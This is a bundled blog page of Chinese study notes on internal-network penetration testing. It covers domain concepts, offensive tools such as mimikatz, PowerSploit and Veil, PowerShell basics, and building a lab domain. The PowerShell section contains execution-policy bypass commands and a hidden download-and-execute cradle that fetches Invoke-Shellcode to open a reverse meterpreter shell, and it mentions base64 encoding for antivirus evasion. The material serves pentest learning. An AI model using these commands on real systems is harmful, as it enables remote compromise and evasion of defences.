import{_ as l,c as o,b as a,a as n,d as e,e as t,r as i,o as r}from"./app-CUDFWA7u.js";const c="/blog/assets/image-20220629212527018-DUnkvuwj.png",d="/blog/assets/image-20220629212612437-Bh6Bn-07.png",u="/blog/assets/image-20220705170219803-0YUcTuUL.png",m="/blog/assets/image-20220711153353769-CmLMgLPF.png",g="/blog/assets/image-20220711153636108-CsrKI-FY.png",h="/blog/assets/image-20220711154510760-B-MjlUku.png",k="/blog/assets/image-20220711154608619-BmuTgr43.png",v="/blog/assets/image-20220711154744021-aMhabm0f.png",b="/blog/assets/image-20220711154845780-DTAoUdvM.png",w="/blog/assets/image-20220711154943103-DD9A6jJl.png",A="/blog/assets/image-20220711155105687-BZY10CP0.png",S="/blog/assets/image-20220711160026677-B5y2eJbO.png",P="/blog/assets/image-20220711160427046-B2GlpcDN.png",x="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAe0AAABLCAYAAABdht+8AAAFkklEQVR4nO3dsU/bWADH8V9OVWf/DSYUKeqUIQPMMUpZmoGuZAKyFDN0YGM4CakMOF0Mnbj1GMJCoyYzDKmUqYrEYfwHdHL/At9gSEOAQO+Ax4PvR4pEnPj1qZX67Xt20tzitx+pRnycfDl6CAAAGPaH6QkAAIDbIdoAAFiCaAMAYAmiDQCAJYg2AACWINoAAFjixV0Msr+/fxfDAACAMe4k2gsLC3cxDAAAGONOov3z58+7GAYAAIzBNW0AACxBtAEAsATRBgDAEkQbAABLEG0AACxBtAEAsATRBgDAEkQbAABLEG0AACxBtAEAsATRBgDAEkQbAABLEG0AACxBtAEAsATRBgDAEkQbAABLvDA9ATxt6+vrpqcAABfY/PcS0ca929raMj0FAJAkra6ump7C/8L2OAAAliDaAABYgmgDAGAJog0AgCWINgAAliDaAABYwly0O768ML58PA7l+Z2Hnw8eSKTGTE5LLdNjAIB9jEU7jvoq5N1fB66L+PA5oSfH70iKFXqORtve8Z0bxwAAwFZGou07joprXe3OO3KcLL6dg11114pyimvq7s7LcbLXBhGOQy03q+oF5WvHLQc9VZvLotuPVUtLuUn5R9LnNznlZhqKBsdzyp09ZhrR4IyoMTM4nsstqXXtGADw9BmJdpD0tFHbUC9J1NsoSerooJ89T3obKtX2lCSJkiRRu56txjuf1lT4UJc7dmRX9Q8FrX1ie/1xqmgnPVEwLS1+SZUeriivlpZyf6pwkipNU6Xpid79PZltfUcNLfiv9SU9f21HlSvHAIDnwcz2ePxVTeXlSjo9lnSwqX51dkyQY0X9kqYmbjH2xJRK/UixlF0fdzxW3o9Za1+fdSR/8nw1na2iv/8TSflXeq3PepObUYPlNAAYivbpsbICx4r6Bc0F7cGK+poTdNwtKD9+mZ1x8yp0j3V6R1PFA5gOdDJYTWePw5W8spV5qjT9S1rIKUe8ATxzRqLdOdjNfoi/qqkpTagj/+wa9pXXtONI/dKUbrPQliY0VeoriiW5dbWTtsb+ewBmVd5q8cjX5tCd4K2lJbUkKWqo0ZKkvFYOTxRMH6l/YmaaAPAYGIl2OUi0rWU5xfPr1GUFZ9ewr7ym/Vur599YlcOAvObeTQ/dRFbRzkmg729+3Yi2/3ZHFUnKr+jV/tC2+esv2qlcNQYAPA/GPvLlzlZVkrQ77+t2t42drZ5vEkfqD37mmvZjlF85zLbBz28iy6/ocGhrPAtzprIztG0+9MKlMQDgGTAU7Y78YlPVXqJkT5q/8ctUypqrdXU8stQ+/8iY4zhyvDC7+ez0WN3anK7/YBgAAHZ6YeIXDb1NTfXOrjW7gXqRJ8eZv/Ae5+yyt2p7SoKyyu83tLkcKi7X5cpVvZ2ofmnkWOFmXxvbQfbUraudXH4XAAA2MhLtert94blbb+vGtrp1bVc9Ff28kmu+YKXjF9Ws9tTmejYA4AkyEu3/yq23lYx5vRwkbIsDAJ4s/pcvAAAsQbQBALAE0QYAwBJEGwAASxBtAAAsQbQBALAE0QYAwBJEGwAAS1j15Sqw0+rqqukpAMCTkFv89iMdPfhx8qWJuQAAgDHYHgcAwBJEGwAASxBtAAAsQbQBALAE0QYAwBJEGwAASxBtAAAsQbQBALAE34iGe7W+vm56Crhn/BkDD4do495tbW2ZngLuCV9RCzwstscBALAE0QYAwBJsjwPAM8C9B7/Y/HtBtAHgmeD+Evvvw2B7HAAASzyCaHfkO57C2PQ8AAB43AxHuyPfmdeuulorOnKciw9vpORx6MnxO5Jihd7I+71QoX/5HAAAngpj17Tj0FNxravaXqKkfOlFecvSdt29cGy5WVWvXZaUhbm2lyi4cO6s5C0rnG1r+FQAAJ6CfwFfAL8pUP9isQAAAABJRU5ErkJggg==",f="/blog/assets/image-20220711163117542-Bhjc7cJX.png",y="/blog/assets/image-20220712164509534-BJQ5KXmF.png",_="/blog/assets/image-20220712162630894-CXmagF79.png",B="/blog/assets/image-20220712162851294-BI33nHzB.png",C="/blog/assets/image-20220712162951530-DEKZS6-M.png",E="/blog/assets/image-20220712164601444-DurfuYb5.png",W="/blog/assets/image-20220712165743288-BiqvwB1x.png",N="/blog/assets/image-20220712171044959-BD8_aKs4.png",D={},I={href:"https://www.pstips.net/powershell-online-tutorials",target:"_blank",rel:"noopener noreferrer"},T={href:"https://github.com/cheetz/PowerSploit",target:"_blank",rel:"noopener noreferrer"},L={href:"https://github.com/darkoperator/powershell_scripts",target:"_blank",rel:"noopener noreferrer"};function U(M,s){const p=i("ExternalLinkIcon");return r(),o("div",null,[s[7]||(s[7]=a('<h1 id="_1-内网渗透测试基础" tabindex="-1"><a class="header-anchor" href="#_1-内网渗透测试基础"><span>1. 内网渗透测试基础</span></a></h1><h2 id="_1-1-内网基础" tabindex="-1"><a class="header-anchor" href="#_1-1-内网基础"><span>1.1 内网基础</span></a></h2><p>工作组：将不同的计算机按功能（或部门）分别列入不同的工作组，处在同一交换机下。</p><p>域：安全边界的计算机集合；在两个域中，一个域中的用户无法访问另一个域中的资源，安全管理控制机制更严格。</p><p>域树：多个域通过建立信任关系组成的集合，子域只能使用父域的名字作为其域名的后缀</p><p><img src="'+c+'" alt="image-20220629212527018"></p><p>域森林：多个域树通过建立信任关系组成的集合</p><p><img src="'+d+'" alt="image-20220629212612437"></p><h2 id="_1-2-主机平台及常用工具" tabindex="-1"><a class="header-anchor" href="#_1-2-主机平台及常用工具"><span>1.2 主机平台及常用工具</span></a></h2><h3 id="_1-2-1-虚拟机安装" tabindex="-1"><a class="header-anchor" href="#_1-2-1-虚拟机安装"><span>1.2.1 虚拟机安装</span></a></h3><p>Kali Linux 即可，其余 略。</p><h3 id="_1-2-2-kali-linux渗透测试平台及常用工具" tabindex="-1"><a class="header-anchor" href="#_1-2-2-kali-linux渗透测试平台及常用工具"><span>1.2.2 Kali Linux渗透测试平台及常用工具</span></a></h3><p><strong>WCE</strong> https://www.ampliasecurity.com/research/windows-credentials-editor/</p><p>​ WCE（Windows凭据管理器）是安全人员广泛使用的一种安全工具，用于通过Penetration Testing评估Windows网络的安全性，支持Windows XP/Server 2003/Vista/7/Server2008/8。</p><p>​ WCE常用于列出登录会话，以及添加、修改、列出和删除关联凭据（例如LM Hash、NTLM Hash、明文密码和Kerberos票据）。</p><p>​ 可以访问[链接]获取</p><p><strong>minikatz</strong> https://github.com/gentilkiwi/mimikatz/releases/</p><p>​ minikatz用于从内存中获取明文密码、现金票据和密钥等。</p><p>​ 可以访问[链接]获取，或者使用“wget&lt;下载链接&gt;”命令下载。</p><p><strong>Responder</strong></p><p>​ Responder不仅用于嗅探网络内所有的LLMNR包和获取各主机的信息，还提供了多种渗透测试环境和场景，包括HTTP/HTTPS、SMB、SQL Server、FTP、IMAP、POP3等。</p><p><strong>BeEF</strong> http://beefproject.com/</p><p>​ BeEF是一款针对浏览器的渗透测试工具。</p><p>​ BeEF可以通过XSS漏洞，利用JavaScript代码对目标主机的浏览器进行测试。同时，BeEF能够配合Metasploit进一步对目标主机进行测试。</p><p>​ 方网站见[链接]。</p><p>**DSHashes ** https://storage.googleapis.com/google-code-archive-source/v2/code.google.com/ptscripts/source-archive.zip</p><p>​ DSHashes的作用是从NTDSXtract中提取用户易于理解的散列值。</p><p>​ 下载地址见[链接]。</p><p><strong>PowerSploit</strong> https://github.com/PowerShellMafia/PowerSploit.git</p><p>​ PowerSploit 是一款基于PowerShell的后渗透（Post-Exploitation）测试框架。PowerSploit包含很多PowerShell脚本，主要用于渗透测试中的信息收集、权限提升、权限维持。</p><p>​ 下载地址见[链接]。</p><p>**Nishang ** https://github.com/samratashok/nishang.git</p><p>​ Nishang是一款针对PowerShell的渗透测试工具，集成了框架、脚本（包括下载和执行、键盘记录、DNS、延时命令等脚本）和各种Payload，被广泛应用于渗透测试的各个阶段。</p><p>​ 下载地址见[链接]。</p><p><strong>Empire</strong></p><p>​ Empire是一款内网渗透测试利器，其跨平台特性类似于Metasploit，有丰富的模块和接口，用户可自行添加模块和功能。</p><p><strong>ps_encoder.py</strong> https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py</p><p>​ ps_encoder.py是使用Base64编码封装的PowerShe命令包，其目的是混淆和压缩代码。</p><p>​ 下载地址见[链接]。</p><p><strong>smbexec</strong> https://github.com/brav0hax/smbexec</p><p>​ smbexec是一个使用Samba工具的快速PsExec类工具。 ​ PsExec的执行原理是：先通过ipcs进行连接，再将psexesvc.exe释放到目标机器中。通过服务管理（SCManager）远程创建 psexecsvc服务并启动服务。客户端连接负责执行命令，服务端负责启动相应的程序并回显数据。 ​ 以上描述的是Syslntermals中的PsExec的执行原理。Metasploit、impacket、PTH中的PsExec使用的都是这种原理。 ​ PsExec会释放文件，特征明显，因此专业的杀毒软件都能将其检测出来。在使用PsExec时需要安装服务，因此会留下日志。退出PsExec时偶尔会出现服务不能删除的情况，因此需要开启adminS445端口共享。在进行攻击溯源时，可以通过日志信息来推测攻击过程。PsExec的特点在于，在进行渗透测试时能直接提供目标主机的System权限。 ​ smbexec的GitHub页面见[链接]。</p><p><strong>后门制造工厂</strong> https://github.com/secretsquirrel/the-backdoor-factory.git</p><p>​ 后门制造工厂用于对PE、ELF、Mach-O等二进制文件注入Shellcode（其作者已经不再维护该工具），下载地址见[链接]。</p><p><strong>Veil</strong> https://github.com/Veil-Framework/Veil.git</p><p>​ Veil用于生成绕过常见防病毒解决方案的Metasploit有效载荷，下载地址见[链接]。</p><p><strong>Metasploit</strong> https://www.metasploit.com/</p><p>​ Metasploit本质上是一个计算机安全项目（框架），目的是为用户提供有关已知安全漏洞的重要信息，帮助用户制定渗透测试及IDS测试计划、战略和开发方法。 ​ Metasploit的官方网站见[链接]。</p><p><strong>Cobalt Strike</strong> https://www.cobaltstrike.com/</p><p>​ Cobalt Strike是一款优秀的后渗透测试平台，功能强大，适合团队间协同工作。Cobalt Strike主要用于进行内网渗透测试。 ​ Cobalt Strike的官方网站见[链接1-16]。</p><h3 id="_1-2-3-windows-渗透测试平台及常用工具" tabindex="-1"><a class="header-anchor" href="#_1-2-3-windows-渗透测试平台及常用工具"><span>1.2.3 Windows 渗透测试平台及常用工具</span></a></h3><p><strong>注意事项</strong></p><p>​ 用于进行渗透测试的Windows主机，推荐安装Windows 7/10操作系统。建议使用虚拟机并对系统进行加固。</p><p>​ 如果不使用NetBlOS，就要禁用NetBIOS功能，并与Kali Linux平台协同工作。</p><p><strong>Nmap</strong></p><p>​ Nmap是一个免费的网络发现和安全审计工具，用于发现主机、扫描端口、识别服务、识别操作系统等。</p><p><strong>Wireshark</strong></p><p>​ Wireshark是一个免费且开源的网络协议和数据包解析器。它能把网络接口设置为混杂模式，监控整个网络的流量。</p><p><strong>PuTTY</strong></p><p>​ PuTTY是一个免费且开源的SSH和Telnet客户端，可用于远程访问。</p><p><strong>sqlmap</strong></p><p>​ sqlmap是一个免费且开源的工具，主要用于检测和执行应用程序中的SQL注入行为。sqlmap也提供了对数据库进行攻击测试的选项。</p><p><strong>Burp Suite</strong></p><p>​ Burp Suite是一个用于对Web应用程序进行安全测试的集成平台，有两个主要的免费工具，分别是Spider和Intruder。Spider用于抓取应用程序页面。Intruder用于对页面进行自动化攻击测试。Burp Suite专业版额外提供了一个工具，叫作Burp Scanner，用于扫描应用程序中的漏洞。</p><p><strong>Hydra</strong></p><p>​ Hydra是一个网络登录破解工具。</p><p><strong>Getif</strong></p><p>​ Getif是一个基于Windows的免费图形界面工具，用于收集SNMP设备的信息。</p><p><strong>Cain&amp;Abel</strong> http://www.oxid.it/cain.html</p><p>​ Cain&amp;Abel是Windows中的一个密码恢复工具，可以通过嗅探网络，使用Dictionary、Brute-Force和Cryptanalysis，破解加密密码、记录VolP会话、恢复无线网络密钥、显示密码框、发现缓存中的密码、分析路由信息，并能恢复各种密码。该工具不会利用任何软件漏洞和无法轻易修复的错误。 ​ Cain&amp;Abel涵盖了协议标准、身份验证方法和缓存中的一些安全弱点，主要用于恢复密码和凭证，下载地址见[链接]。</p><p><strong>PowerSploit</strong> https://github.com/mattifestation/PowerSploit</p><p>​ PowerSploit的GitHub页面见[链接]。</p><p><strong>Nishang</strong> https://github.com/samratashok/nishang</p><p>​ Nishang的GitHub页面见[链接]。</p><h3 id="_1-2-4-windows-powershell-基础" tabindex="-1"><a class="header-anchor" href="#_1-2-4-windows-powershell-基础"><span>1.2.4 Windows Powershell 基础</span></a></h3>',74)),n("p",null,[s[1]||(s[1]=e("Powershell 教程网站：")),n("a",I,[s[0]||(s[0]=e("PowerShell 在线教程 – PowerShell 中文博客 (pstips.net)")),t(p)])]),s[8]||(s[8]=a(`<p>查看Powershell版本号</p><div class="language-powershell line-numbers-mode" data-highlighter="prismjs" data-ext="powershell" data-title="powershell"><pre><code><span class="line"><span class="token function">PS</span> C:\\Users\\perry&gt; <span class="token function">Get-Host</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Name             : ConsoleHost</span>
<span class="line">Version          : 5<span class="token punctuation">.</span>1<span class="token punctuation">.</span>19041<span class="token punctuation">.</span>1682</span>
<span class="line">InstanceId       : bf46d12f-a2ca-4103-a3ae-556d90c58801</span>
<span class="line">UI               : System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>Internal<span class="token punctuation">.</span>Host<span class="token punctuation">.</span>InternalHostUserInterface</span>
<span class="line">CurrentCulture   : zh-CN</span>
<span class="line">CurrentUICulture : zh-CN</span>
<span class="line">PrivateData      : Microsoft<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>ConsoleHost+ConsoleColorProxy</span>
<span class="line">DebuggerEnabled  : True</span>
<span class="line">IsRunspacePushed : False</span>
<span class="line">Runspace         : System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>Runspaces<span class="token punctuation">.</span>LocalRunspace</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-powershell line-numbers-mode" data-highlighter="prismjs" data-ext="powershell" data-title="powershell"><pre><code><span class="line"><span class="token function">PS</span> C:\\Users\\perry&gt; <span class="token variable">$PSVersionTable</span><span class="token punctuation">.</span>PSVERSION</span>
<span class="line"></span>
<span class="line">Major  Minor  Build  Revision</span>
<span class="line"><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></span>
<span class="line">5      1      19041  1682</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>.ps1 文件</strong></p><p>一个PowerShell脚本其实就是一个简单的文本文件，其扩展名为“ps1”。</p><p><strong>执行策略</strong></p><p>为了防止使用者运行恶意脚本，PowerShell提供了一个执行策略。在默认情况下，这个执行策略被设置为“不能运行”。</p><p>如果PowerShell脚本无法运行，可以使用下面的cmdlet命令查询当前的执行策略。</p><div class="language-powershell line-numbers-mode" data-highlighter="prismjs" data-ext="powershell" data-title="powershell"><pre><code><span class="line"><span class="token function">PS</span> C:\\Users\\perry&gt; <span class="token function">Get-ExecutionPolicy</span></span>
<span class="line">Restricted</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>设置PowerShell的执行策略。</strong></p><div class="language-powershell line-numbers-mode" data-highlighter="prismjs" data-ext="powershell" data-title="powershell"><pre><code><span class="line"><span class="token function">Set-ExecutionPolicy</span> &lt;policy name&gt;</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>参数列表：</p><p>Restricted：脚本不能运行（默认设置）。</p><p>RemoteSigned：在本地创建的脚本可以运行，但从网上下载的脚本不能运行（拥有数字证书签名的除外）。</p><p>AllSigned：仅当脚本由受信任的发布者签名时才能运行。</p><p>Unrestricted：允许所有脚本运行。</p><p><strong>管道</strong></p><p>管道的作用是将一个命令的输出作为另一个命令的输入，两个命令之间用 “|” 连接。</p><p>如：执行如下命令，让所有正在运行的、名字以字符“p”开头的程序停止运行。</p><div class="language-powershell line-numbers-mode" data-highlighter="prismjs" data-ext="powershell" data-title="powershell"><pre><code><span class="line"><span class="token function">PS</span>&gt; <span class="token function">get-process</span> p* <span class="token punctuation">|</span> <span class="token function">stop-process</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h4 id="常用命令" tabindex="-1"><a class="header-anchor" href="#常用命令"><span>常用命令</span></a></h4><p>在PowerShell下，类似cmd命令的命令叫作cmdlet命令。二者的命名规范一致，都采用“动词-名词”的形式，例如“New-ltem”。</p><p>动词部分一般为Add、New、Get、Remove、Set等。</p><p>命令的别名一般兼容WindowsCommand和Linux Shell，例如Get-Childltem命令在dir和ls下均可使用。</p><p>另外，PowerShell命令不区分大小写。</p><div class="language-powershell line-numbers-mode" data-highlighter="prismjs" data-ext="powershell" data-title="powershell"><pre><code><span class="line"><span class="token comment"># 新建目录folder1</span></span>
<span class="line"><span class="token function">PS</span> C:\\Users\\perry\\Desktop&gt; <span class="token function">New-Item</span> folder1 <span class="token operator">-</span>ItemType Directory</span>
<span class="line"></span>
<span class="line"><span class="token comment"># 新建文件</span></span>
<span class="line"><span class="token function">PS</span> C:\\Users\\perry\\Desktop&gt; <span class="token function">New-Item</span> 1<span class="token punctuation">.</span>txt <span class="token operator">-</span>ItemType File</span>
<span class="line"></span>
<span class="line"><span class="token comment"># 删除目录folder1</span></span>
<span class="line"><span class="token function">PS</span> C:\\Users\\perry\\Desktop&gt; <span class="token function">Remove-Item</span> folder1</span>
<span class="line"></span>
<span class="line"><span class="token comment"># 显示文本内容</span></span>
<span class="line"><span class="token function">PS</span> C:\\Users\\perry\\Desktop&gt; <span class="token function">Get-Content</span> 1<span class="token punctuation">.</span>txt</span>
<span class="line">This is a txt file<span class="token punctuation">.</span></span>
<span class="line"></span>
<span class="line"><span class="token comment"># 设置文本内容</span></span>
<span class="line"><span class="token function">PS</span> C:\\Users\\perry\\Desktop&gt; <span class="token function">Set-Content</span> 1<span class="token punctuation">.</span>txt <span class="token operator">-</span>Value helloWorld!</span>
<span class="line"><span class="token function">PS</span> C:\\Users\\perry\\Desktop&gt; <span class="token function">Get-Content</span> 1<span class="token punctuation">.</span>txt</span>
<span class="line">helloWorld!</span>
<span class="line"></span>
<span class="line"><span class="token comment"># 追加内容</span></span>
<span class="line"><span class="token function">PS</span> C:\\Users\\perry\\Desktop&gt; <span class="token function">Add-Content</span> 1<span class="token punctuation">.</span>txt <span class="token operator">-</span>Value <span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span></span>
<span class="line"><span class="token function">PS</span> C:\\Users\\perry\\Desktop&gt; <span class="token function">Get-Content</span> 1<span class="token punctuation">.</span>txt</span>
<span class="line">helloWorld!</span>
<span class="line"><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span></span>
<span class="line"></span>
<span class="line"><span class="token comment"># 清除内容</span></span>
<span class="line"><span class="token function">PS</span> C:\\Users\\perry\\Desktop&gt; <span class="token function">Clear-Content</span> 1<span class="token punctuation">.</span>txt</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>要运行 PowerShell 脚本，必须使用管理员权限将策略从Restricted 改成Unrestricted。</p><h5 id="绕过本地权限并运行" tabindex="-1"><a class="header-anchor" href="#绕过本地权限并运行"><span><strong>绕过本地权限并运行</strong></span></a></h5><p>​ 将 test.ps1 上传至目标服务器。执行如下命令，可绕过安全策略执行。</p><div class="language-powershell line-numbers-mode" data-highlighter="prismjs" data-ext="powershell" data-title="powershell"><pre><code><span class="line">PowerShell<span class="token punctuation">.</span>exe <span class="token operator">-</span>ExecutionPolicy Bypass <span class="token operator">-</span>File test<span class="token punctuation">.</span>ps1</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​ 将同一个脚本上传到目标服务器，在目标本地执行 ps1 文件</p><div class="language-powershell line-numbers-mode" data-highlighter="prismjs" data-ext="powershell" data-title="powershell"><pre><code><span class="line">PowerShell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec bypass <span class="token operator">-</span>Command <span class="token string">&quot;&amp; {Import-Module C:\\test.ps1; Invoke-AllChecks}&quot;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​ 从网站服务器下载脚本，绕过本地权限并隐藏执行</p><div class="language-powershell line-numbers-mode" data-highlighter="prismjs" data-ext="powershell" data-title="powershell"><pre><code><span class="line">PowerShell<span class="token punctuation">.</span>exe <span class="token operator">-</span>ExecutionPolicy Bypass <span class="token operator">-</span>WindowStyle Hidden <span class="token operator">-</span>NoProfile <span class="token operator">-</span>NonIIEX<span class="token punctuation">(</span><span class="token function">New-ObjectNet</span><span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">&quot;xxx.ps1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token namespace">[Parameters]</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>如：使用PowerUp.psl脚本在目标机器上执行meterpreter Shell。</p><p>首先，要知道使用的参数是什么。查看 Invoke-Shellcode.psl 源码，了解如何调用反向HTTPS meterpreter Shell。</p>`,36)),n("blockquote",null,[n("p",null,[s[3]||(s[3]=e("项目：")),n("a",T,[s[2]||(s[2]=e("cheetz/PowerSploit: PowerSploit - A PowerShell Post-Exploitation Framework (github.com)")),t(p)])]),s[4]||(s[4]=n("p",null,"下载：https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1",-1))]),s[9]||(s[9]=a('<p><img src="'+u+`" alt="image-20220705170219803"></p><p>完整执行代码：</p><div class="language-powershell line-numbers-mode" data-highlighter="prismjs" data-ext="powershell" data-title="powershell"><pre><code><span class="line">PowerShell<span class="token punctuation">.</span>exe <span class="token operator">-</span>ExecutionPolicy Bypass <span class="token operator">-</span>WindowsStyle Hidden <span class="token operator">-</span>No Profile <span class="token operator">-</span>NonI <span class="token function">IEX</span><span class="token punctuation">(</span><span class="token function">New-ObjectNet</span><span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">&quot;[URL]&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">Invoke-Shellcode</span> <span class="token operator">-</span>Payload windows/meterpreter/reverse_https <span class="token operator">-</span>Lhost 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>30<span class="token punctuation">.</span>129 <span class="token operator">-</span>Lport 80</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-powershell line-numbers-mode" data-highlighter="prismjs" data-ext="powershell" data-title="powershell"><pre><code><span class="line">PowerShell<span class="token punctuation">.</span>exe <span class="token operator">-</span>ExecutionPolicy Bypass <span class="token operator">-</span>WindowsStyle Hidden <span class="token operator">-</span>No Profile <span class="token operator">-</span>NonI <span class="token function">IEX</span><span class="token punctuation">(</span><span class="token function">New-ObjectNet</span><span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">&quot;https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">Invoke-Shellcode</span> <span class="token operator">-</span>Payload windows/meterpreter/reverse_https <span class="token operator">-</span>Lhost 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>30<span class="token punctuation">.</span>129 <span class="token operator">-</span>Lport 80</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p>常用参数：</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>ExecutionPolicy Bypass（-Exec Bypass）</td><td>绕过执行安全策略。这个参数非常重要。在默认情况下，PowerShell的安全策略规定PowerShell不能运行命令和文件</td></tr><tr><td>WindowStyle Hidden（-W Hidden）</td><td>隐藏窗口</td></tr><tr><td>NonInteractive（-Nonl）</td><td>非交互模式。PowerShel不为用户提供交互式的提示</td></tr><tr><td>NoProfile（-NoP）</td><td>PowerShell 控制台不加载当前用户的配置文件</td></tr><tr><td>noexit</td><td>执行后不退出Shell</td></tr><tr><td>NoLogo</td><td>启动不显示版权标志的PowerShell</td></tr></tbody></table></blockquote><h5 id="使用base64对powershell命令进行编码" tabindex="-1"><a class="header-anchor" href="#使用base64对powershell命令进行编码"><span>使用Base64对PowerShell命令进行编码</span></a></h5><p>作用：免杀</p>`,7)),n("p",null,[s[6]||(s[6]=e("项目：")),n("a",L,[s[5]||(s[5]=e("darkoperator/powershell_scripts: Powershell Scripts (github.com)")),t(p)])]),s[10]||(s[10]=a(`<p>下载：https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py</p><h5 id="运行32位和64位powershell" tabindex="-1"><a class="header-anchor" href="#运行32位和64位powershell"><span>运行32位和64位PowerShell</span></a></h5><p>*：一些PowerShell脚本只能运行在指定的平台上。例如，在64位的平台上，需要通过64位的PowerShell脚本来运行命令。</p><div class="language-powershell line-numbers-mode" data-highlighter="prismjs" data-ext="powershell" data-title="powershell"><pre><code><span class="line"><span class="token comment"># 32位</span></span>
<span class="line">Powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>NoP <span class="token operator">-</span>NonI <span class="token operator">-</span>W Hidden <span class="token operator">-</span>Exec Bypass</span>
<span class="line"></span>
<span class="line"><span class="token comment"># 64位</span></span>
<span class="line"><span class="token operator">%</span>WinDir%\\syswow74\\windowspowershell\\v1<span class="token punctuation">.</span>0\\powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>NoP <span class="token operator">-</span>NonI <span class="token operator">-</span>W Hidden <span class="token operator">-</span>Exec Bypass</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_1-3-构建内网环境" tabindex="-1"><a class="header-anchor" href="#_1-3-构建内网环境"><span>1.3 构建内网环境</span></a></h2><p>机器：</p><ul><li>Windows Server 2012</li><li>Windows Server 2008</li><li>Windows 7</li></ul><h3 id="windows-server-2012-配置" tabindex="-1"><a class="header-anchor" href="#windows-server-2012-配置"><span>Windows Server 2012 配置</span></a></h3><p>IP与计算机名：</p><p><img src="`+m+'" alt="image-20220711153353769"></p><p>安装服务</p><p><img src="'+g+'" alt="image-20220711153636108"></p><p>安装成功后重启，并将其提升位域控制器</p><p><img src="'+h+'" alt="image-20220711154510760"></p><p><img src="'+k+'" alt="image-20220711154608619"></p><p><img src="'+v+'" alt="image-20220711154744021"></p><p>DNS选项的警告不用管，保持默认 下一步</p><p><img src="'+b+'" alt="image-20220711154845780"></p><p>同样 保持默认 继续</p><p><img src="'+w+'" alt="image-20220711154943103"></p><p>点击“安装”</p><p><img src="'+A+'" alt="image-20220711155105687"></p><p>重启完成后，可见：</p><p><img src="'+S+'" alt="image-20220711160026677"></p><p>为 Windows Server 2008 和 Windows 7 用户创建域控制服务器账户</p><p><img src="'+P+'" alt="image-20220711160427046"></p><blockquote><p>补充：改下姓。。。</p><p><img src="'+x+'" 